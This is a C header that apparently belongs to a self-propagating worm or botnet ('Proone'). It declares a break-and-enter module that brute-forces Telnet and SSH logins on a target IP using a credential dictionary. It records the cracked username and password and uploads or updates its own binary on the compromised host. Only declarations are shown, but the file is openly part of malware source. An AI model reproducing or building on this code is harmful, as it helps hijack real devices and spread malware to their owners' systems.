#pragma once
#include <stdio.h>
#include <stddef.h>
#include <inttypes.h>
#include <stdbool.h>

#include <mbedtls/ssl.h>
#include <mbedtls/ctr_drbg.h>

#include "pth.h"
#include "protocol.h"
#include "pack.h"
#include "cred_dict.h"


struct prne_bne;
typedef struct prne_bne_param prne_bne_param_t;
typedef struct prne_bne prne_bne_t;
typedef struct prne_bne_result prne_bne_result_t;

enum prne_bne_vector {
	PRNE_BNE_V_NONE = -1,
	PRNE_BNE_V_HTBT,
	PRNE_BNE_V_BRUTE_TELNET,
	PRNE_BNE_V_BRUTE_SSH,
	NB_PRNE_BNE_V
};
typedef enum prne_bne_vector prne_bne_vector_t;

struct prne_bne_param {
	const prne_cred_dict_t *cred_dict;
	mbedtls_ssl_config *htbt_ssl_conf;
	struct {
		const prne_bne_vector_t *arr;
		size_t cnt;
	} vector;
	struct {
		char *(*exec_name)(void *ctx);
		char *(*bne_lock_name)(void *ctx);
		bool (*enter_dd)(void *ctx);
		void (*exit_dd)(void *ctx);
		uint64_t (*uptime)(void *ctx);
		/**
		* \brief  called by bne instance to compare versions of Proone to
		*         determine if binary update has to be performed.
		* \return negative value if \p uuid is newer, 0 if \p uuid is identical
		          to the current version or positive value if \p uuid is older
		*/
		int (*vercmp)(void *ctx, const uint8_t *uuid);
		int (*tmpfile)(
			void *ctx,
			const int flags,
			const mode_t mode,
			size_t req_size,
			char **path);
		bool (*upbin)(void *ctx, const char *path, const prne_htbt_cmd_t *cmd);
	} cb;
	void *cb_ctx;
	const prne_rcb_param_t *rcb;
	const uint8_t *org_id;
	prne_ip_addr_t subject;
	unsigned int login_attempt;
};

struct prne_bne_result {
	struct {
		char *id;
		char *pw;
	} cred;
	const prne_ip_addr_t *subject;
	int err;
	prne_bne_vector_t vec;
	prne_pack_rc_t prc;
	prne_bin_host_t bin_host;
	prne_bin_host_t bin_used;
	bool ny_instance;
};

void prne_init_bne_param (prne_bne_param_t *p);
void prne_free_bne_param (prne_bne_param_t *p);

const char *prne_bne_vector_tostr (const prne_bne_vector_t v);

prne_bne_t *prne_alloc_bne (
	prne_worker_t *w,
	mbedtls_ctr_drbg_context *ctr_drbg,
	const prne_bne_param_t *param);
const prne_ip_addr_t *prne_bne_get_subject (const prne_bne_t *bne);
